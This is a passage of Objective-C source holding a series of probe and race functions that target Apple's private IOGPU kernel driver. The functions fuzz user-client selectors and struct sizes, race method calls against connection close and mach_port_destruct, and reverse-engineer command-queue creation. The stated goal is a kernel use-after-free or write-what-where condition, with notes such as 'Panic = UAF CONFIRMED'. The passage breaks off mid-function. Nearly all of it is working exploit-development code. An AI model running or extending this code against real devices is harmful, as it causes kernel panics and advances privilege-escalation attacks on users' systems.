+ (NSString *)runP010IOGPUSelProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOGPU sel probe -- deep probe of non-BadArg selectors\n"];
    [out appendString:@"Try sel=9 with different input sizes + scalar input.\n"];
    [out appendString:@"Also sweep ALL sels with scalar input (maybe some take scalars).\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }

    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no device\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);
    [out appendFormat:@"conn=%u dev=%p\n\n", conn, dev];

    // Phase 1: sel=9 with different struct sizes
    [out appendString:@"--- sel=9 struct size sweep ---\n"];
    size_t sizes[] = {0, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096};
    int nSizes = (int)(sizeof(sizes) / sizeof(sizes[0]));
    for (int si = 0; si < nSizes; si++) {
        void *inS = sizes[si] ? calloc(1, sizes[si]) : NULL;
        size_t oc = 0x1000;
        void *outS = calloc(1, 0x1000);
        kern_return_t r = pCall(conn, 9, NULL, 0, inS, sizes[si], NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        [out appendFormat:@"sel=9 inSize=%zu -> 0x%08x", sizes[si], ur];
        if (ur == 0xe00002c2) [out appendString:@" BadArg"];
        else if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" NEW"];
        if (oc != 0x1000) [out appendFormat:@" outCnt=%zu", oc];
        [out appendString:@"\n"];
        if (inS) free(inS);
        free(outS);
    }

    // Phase 2: sel=9 with scalar input (1-8 scalars)
    [out appendString:@"\n--- sel=9 scalar sweep ---\n"];
    for (uint32_t n = 1; n <= 8; n++) {
        uint64_t sc[8] = {0x1000, 0, 0, 0, 0, 0, 0, 0};
        size_t oc = 0x1000;
        void *outS = calloc(1, 0x1000);
        kern_return_t r = pCall(conn, 9, sc, n, NULL, 0, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        [out appendFormat:@"sel=9 nScalar=%u -> 0x%08x", n, ur];
        if (ur == 0xe00002c2) [out appendString:@" BadArg"];
        else if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }

    // Phase 3: ALL selectors with scalar input (1 scalar = 0)
    [out appendString:@"\n--- all sel scalar=1 (val=0x1000) ---\n"];
    int nonBad = 0;
    for (uint32_t sel = 0; sel < 56; sel++) {
        uint64_t sc[2] = {0x1000, 0};
        size_t oc = 0x1000;
        void *outS = calloc(1, 0x1000);
        kern_return_t r = pCall(conn, sel, sc, 2, NULL, 0, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) { free(outS); continue; }
        nonBad++;
        [out appendFormat:@"sel=%u scalar -> 0x%08x", sel, ur];
        if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }
    [out appendFormat:@"non-BadArg scalar sels: %d\n", nonBad];

    // Phase 4: ALL selectors with NO input (empty)
    [out appendString:@"\n--- all sel no input ---\n"];
    nonBad = 0;
    for (uint32_t sel = 0; sel < 56; sel++) {
        size_t oc = 0x1000;
        void *outS = calloc(1, 0x1000);
        kern_return_t r = pCall(conn, sel, NULL, 0, NULL, 0, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) { free(outS); continue; }
        nonBad++;
        [out appendFormat:@"sel=%u empty -> 0x%08x", sel, ur];
        if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" NEW"];
        if (oc != 0x1000) [out appendFormat:@" outCnt=%zu", oc];
        [out appendString:@"\n"];
        free(outS);
    }
    [out appendFormat:@"non-BadArg empty sels: %d\n", nonBad];

    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"OK/NEW = method ran. NoRes = needs setup. Race candidates = non-BadArg.\n"];
    return out;
}

+ (NSString *)runP010IOGPURace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOGPU race -- method-vs-close N=1\n"];
    [out appendString:@"sel=9 (struct 128) + sel=23 (empty) vs IOServiceClose.\n"];
    [out appendString:@"App crash = dead port (NOT race). Panic = UAF race SIGNAL.\n"];
    [out appendString:@"Do NOT re-tap if panic.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");

    // Race 1: sel=9 (struct 128 bytes) vs close
    {
        CFMutableDictionaryRef m = pMatching("IOGPU");
        io_service_t svc = m ? pGet(*pMainPort, m) : 0;
        if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
        void *dev = pDevCreate(svc);
        io_connect_t conn = dev ? pGetConn(dev) : 0;
        [out appendFormat:@"Race1 sel=9: svc=%u dev=%p conn=%u\n", svc, dev, conn];
        if (!conn) { [out appendString:@"no conn\n"]; pRelease(svc); goto race2; }

        void *inS = calloc(1, 128);
        __block volatile int go = 0;
        __block kern_return_t r1 = 0;
        __block kern_return_t r2 = 0;

        dispatch_queue_t rq = dispatch_queue_create("race", NULL);
        dispatch_group_t grp = dispatch_group_create();

        dispatch_group_async(grp, rq, ^{
            while (!go) { }
            size_t oc = 0x1000;
            void *outS = calloc(1, 0x1000);
            r1 = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
            free(outS);
        });
        dispatch_group_async(grp, rq, ^{
            while (!go) { }
            r2 = pClose(conn);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"  method sel=9 -> 0x%08x  close -> 0x%08x\n", (unsigned)r1, (unsigned)r2];
        [out appendString:@"  survived = race missed (or dead port). panic = race SIGNAL.\n"];
        free(inS);
        if (dev && pDevRelease) pDevRelease(dev);
        pRelease(svc);
    }

race2:
    // Race 2: sel=23 (no input) vs close
    {
        CFMutableDictionaryRef m = pMatching("IOGPU");
        io_service_t svc = m ? pGet(*pMainPort, m) : 0;
        if (!svc) { [out appendString:@"STOP no service (race2)\n"]; return out; }
        void *dev = pDevCreate(svc);
        io_connect_t conn = dev ? pGetConn(dev) : 0;
        [out appendFormat:@"Race2 sel=23: svc=%u dev=%p conn=%u\n", svc, dev, conn];
        if (!conn) { [out appendString:@"no conn\n"]; pRelease(svc); goto done; }

        __block volatile int go = 0;
        __block kern_return_t r1 = 0;
        __block kern_return_t r2 = 0;

        dispatch_queue_t rq = dispatch_queue_create("race2", NULL);
        dispatch_group_t grp = dispatch_group_create();

        dispatch_group_async(grp, rq, ^{
            while (!go) { }
            size_t oc = 0x1000;
            void *outS = calloc(1, 0x1000);
            r1 = pCall(conn, 23, NULL, 0, NULL, 0, NULL, NULL, outS, &oc);
            free(outS);
        });
        dispatch_group_async(grp, rq, ^{
            while (!go) { }
            r2 = pClose(conn);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"  method sel=23 -> 0x%08x  close -> 0x%08x\n", (unsigned)r1, (unsigned)r2];
        [out appendString:@"  survived = race missed (or dead port). panic = race SIGNAL.\n"];
        if (dev && pDevRelease) pDevRelease(dev);
        pRelease(svc);
    }

done:
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If survived: race window narrow, try N=100 next.\n"];
    [out appendString:@"If panic: UAF confirmed -- do NOT re-tap.\n"];
    return out;
}

+ (NSString *)runP010IOGPURaceN {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOGPU race N=10000 -- 10000 methods vs 1 close (mach_port_destruct)\n"];
    [out appendString:@"Uses mach_port_destruct (destroys port directly, not IOServiceClose).\n"];
    [out appendString:@"Panic = UAF CONFIRMED. Do NOT re-tap if panic.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");

    // mach_port_destruct -- use dlsym to avoid header conflict
    typedef kern_return_t (*mach_port_destruct_t)(mach_port_t, mach_port_name_t, mach_port_name_t);
    mach_port_destruct_t pDestruct = dlsym(RTLD_DEFAULT, "mach_port_destruct");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    io_connect_t conn = dev ? pGetConn(dev) : 0;
    [out appendFormat:@"conn=%u dev=%p\n", conn, dev];
    if (!conn) { [out appendString:@"STOP no conn\n"]; pRelease(svc); return out; }

    void *inS = calloc(1, 128);
    void *outS = calloc(1, 0x1000);
    const int N = 10000;
    __block volatile int go = 0;
    __block int methodCount = 0;
    __block kern_return_t lastMethod = 0;
    __block kern_return_t closeRC = 0;
    __block volatile int closed = 0;

    dispatch_queue_t rq = dispatch_queue_create("raceN", NULL);
    dispatch_group_t grp = dispatch_group_create();

    // Thread 1: 10000 method calls in tight loop
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (int i = 0; i < N; i++) {
            size_t oc = 0x1000;
            lastMethod = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
            methodCount++;
            if (closed) break;
        }
    });

    // Thread 2: mach_port_destruct after delay (let ~100 methods fire first)
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (volatile int i = 0; i < 5000; i++) { }
        closeRC = pDestruct(mach_task_self(), conn, 0);
        closed = 1;
    });

    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"method calls completed: %d / %d\n", methodCount, N];
    [out appendFormat:@"last method rc: 0x%08x\n", (unsigned)lastMethod];
    [out appendFormat:@"port_destruct rc: 0x%08x\n", (unsigned)closeRC];
    [out appendString:@"survived = race missed. panic = UAF CONFIRMED.\n"];

    free(inS); free(outS);
    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If survived: try async approach. If panic: UAF confirmed.\n"];
    return out;
}

+ (NSString *)runP010IOGPUMethodRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 method-vs-method race -- sel=9 vs sel=23 concurrent\n"];
    [out appendString:@"No DefaultLocking: both methods access UC data without locking.\n"];
    [out appendString:@"Concurrent corruption = write-what-where. Panic = race CONFIRMED.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    io_connect_t conn = dev ? pGetConn(dev) : 0;
    [out appendFormat:@"conn=%u dev=%p\n", conn, dev];
    if (!conn) { [out appendString:@"STOP no conn\n"]; pRelease(svc); return out; }

    void *inS = calloc(1, 128);
    void *outS = calloc(1, 0x1000);
    const int N = 10000;
    __block volatile int go = 0;
    __block int count9 = 0, count23 = 0;
    __block kern_return_t last9 = 0, last23 = 0;

    dispatch_queue_t rq = dispatch_queue_create("mrace", NULL);
    dispatch_group_t grp = dispatch_group_create();

    // Thread 1: sel=9 (struct 128) in tight loop
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (int i = 0; i < N; i++) {
            size_t oc = 0x1000;
            last9 = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
            count9++;
        }
    });

    // Thread 2: sel=23 (empty) in tight loop
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (int i = 0; i < N; i++) {
            size_t oc = 0x1000;
            last23 = pCall(conn, 23, NULL, 0, NULL, 0, NULL, NULL, outS, &oc);
            count23++;
        }
    });

    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"sel=9 calls: %d / %d  last rc: 0x%08x\n", count9, N, (unsigned)last9];
    [out appendFormat:@"sel=23 calls: %d / %d  last rc: 0x%08x\n", count23, N, (unsigned)last23];
    [out appendString:@"survived = race missed or no corruption. panic = race CONFIRMED.\n"];

    free(inS); free(outS);
    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If survived: try N=100000 or RE sel=9 struct. If panic: race confirmed.\n"];
    return out;
}

+ (NSString *)runP010IOGPUSel6Probe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 sel=6 probe -- find command queue creation struct size\n"];
    [out appendString:@"RE'd: IOGPUCommandQueueCreate uses selector=6.\n"];
    [out appendString:@"Descriptor has field at offset 0x405. Try sizes around that.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    io_connect_t conn = dev ? pGetConn(dev) : 0;
    [out appendFormat:@"conn=%u\n\n", conn];
    if (!conn) { [out appendString:@"STOP no conn\n"]; pRelease(svc); return out; }

    // Try sel=6 with sizes from 0x100 to 0x800
    int sizes[] = {
        0x100, 0x200, 0x300, 0x400, 0x406, 0x410, 0x420, 0x440, 0x480,
        0x500, 0x600, 0x700, 0x800
    };
    int nSizes = (int)(sizeof(sizes) / sizeof(sizes[0]));
    [out appendString:@"--- sel=6 struct size sweep ---\n"];
    for (int si = 0; si < nSizes; si++) {
        void *inS = calloc(1, sizes[si]);
        // Put a queue type in the first field
        *(uint32_t *)inS = 1;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, 6, NULL, 0, inS, sizes[si], NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        [out appendFormat:@"sel=6 size=0x%x -> 0x%08x", sizes[si], ur];
        if (ur == 0xe00002c2) [out appendString:@" BadArg"];
        else if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" NEW"];
        if (oc != 0x100) [out appendFormat:@" outCnt=%zu", oc];
        [out appendString:@"\n"];
        free(inS); free(outS);
    }

    // Also try sel=9 with size 0x406 (same as descriptor)
    [out appendString:@"\n--- sel=9 with size=0x406 ---\n"];
    void *inS9 = calloc(1, 0x406);
    *(uint32_t *)inS9 = 1;
    size_t oc9 = 0x100;
    void *outS9 = calloc(1, 0x100);
    kern_return_t r9 = pCall(conn, 9, NULL, 0, inS9, 0x406, NULL, NULL, outS9, &oc9);
    [out appendFormat:@"sel=9 size=0x406 -> 0x%08x\n", (unsigned)r9];
    free(inS9); free(outS9);

    // Try all selectors with size=0x406
    [out appendString:@"\n--- all sel with size=0x406 ---\n"];
    void *inSa = calloc(1, 0x406);
    *(uint32_t *)inSa = 1;
    int nonBad = 0;
    for (uint32_t sel = 0; sel < 56; sel++) {
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, sel, NULL, 0, inSa, 0x406, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) { free(outS); continue; }
        nonBad++;
        [out appendFormat:@"sel=%u -> 0x%08x", sel, ur];
        if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002c7) [out appendString:@" NotAcc"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }
    free(inSa);
    [out appendFormat:@"non-BadArg sels (size=0x406): %d\n", nonBad];

    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"OK on sel=6 = command queue created! Then race submit vs destroy.\n"];
    return out;
}

+ (NSString *)runP010IOGPUQueueCreate {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOGPU queue create -- call IOGPUCommandQueueCreate from framework\n"];
    [out appendString:@"RE'd: struct size=0x408, fields at 0x400/0x404/0x405 from device.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");

    // IOGPUCommandQueueCreate(device, args, argsSize) -> queueRef
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    typedef void (*QueueRelease_t)(void *);
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");
    [out appendFormat:@"symbols: queueCreate=%p queueRelease=%p\n", pQueueCreate, pQueueRelease];

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    [out appendFormat:@"dev=%p\n", dev];
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }

    // Dump first 0xd0 bytes of device object
    [out appendString:@"--- device object dump (first 0xd0 bytes) ---\n"];
    uint8_t *db = (uint8_t *)dev;
    for (int i = 0; i < 0xd0; i += 16) {
        NSMutableString *line = [NSMutableString string];
        [line appendFormat:@"0x%02x:", i];
        for (int j = 0; j < 16 && i+j < 0xd0; j++)
            [line appendFormat:@" %02x", db[i+j]];
        [out appendString:line];
        [out appendString:@"\n"];
    }

    // Try calling IOGPUCommandQueueCreate with 0x408-byte struct
    // Copy device fields into args+0x400, 0x404, 0x405
    void *args = calloc(1, 0x410);
    // Try copying from various device offsets into args+0x400
    // Device has uint32 fields at 0x08, 0x0C, 0x10, 0x14
    // Try each as the source for args+0x400
    uint32_t *d32 = (uint32_t *)dev;
    [out appendString:@"\n--- trying device fields at args+0x400 ---\n"];
    int offsets[] = {0x08, 0x0C, 0x10, 0x14, 0x18, 0x1C, 0x20, 0x24, 0x28, 0x2C, 0x30, 0x34, 0x38, 0x3C, 0x40, 0x44, 0x48, 0x4C, 0xA0, 0xA4, 0xA8, 0xAC, 0xB0, 0xB4, 0xB8, 0xBC, 0xC0, 0xC4, 0xC8, 0xCC};
    int nOff = (int)(sizeof(offsets) / sizeof(offsets[0]));
    for (int oi = 0; oi < nOff; oi++) {
        memset(args, 0, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = d32[offsets[oi]/4];
        *(uint8_t *)((uint8_t *)args + 0x404) = (uint8_t)(d32[offsets[oi]/4] & 0xFF);
        *(uint8_t *)((uint8_t *)args + 0x405) = 0;
        void *q = pQueueCreate(dev, args, 0x410);
        unsigned int qaddr = (unsigned int)(uintptr_t)q;
        [out appendFormat:@"dev+0x%02x -> args+0x400=0x%x queue=%p", offsets[oi], d32[offsets[oi]/4], q];
        if (q) { [out appendString:@" CREATED"]; pQueueRelease(q); break; }
        [out appendString:@"\n"];
    }

    // Also try with first uint32 = 1 (queue type) + device fields
    if (!pQueueCreate) { [out appendString:@"STOP no symbol\n"]; }
    free(args);
    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"CREATED = queue created. Then race submit vs destroy.\n"];
    return out;
}

+ (NSString *)runP010IOGPUQueueRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOGPU queue race -- find queue-using sels then race vs release\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef void (*QueueRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    // Create queue with proper args
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    [out appendFormat:@"queue=%p conn=%u\n", queue, conn];
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    // Scan queue object for IDs (the queue handle is stored in the object)
    // From RE: queue object has handle at offset 0x18 (two uint64s)
    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue + 0x18);
    uint64_t qid2 = *(uint64_t *)((uint8_t *)queue + 0x20);
    [out appendFormat:@"queue handle: qid1=0x%llx qid2=0x%llx\n", qid1, qid2];

    // Try all selectors with qid1 as scalar input
    [out appendString:@"\n--- sel sweep with queue handle as scalar ---\n"];
    int nonBad = 0;
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 6) continue; // skip create
        uint64_t sc[4] = {qid1, qid2, 0, 0};
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, sel, sc, 2, NULL, 0, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) { free(outS); continue; }
        nonBad++;
        [out appendFormat:@"sel=%u scalar -> 0x%08x", sel, ur];
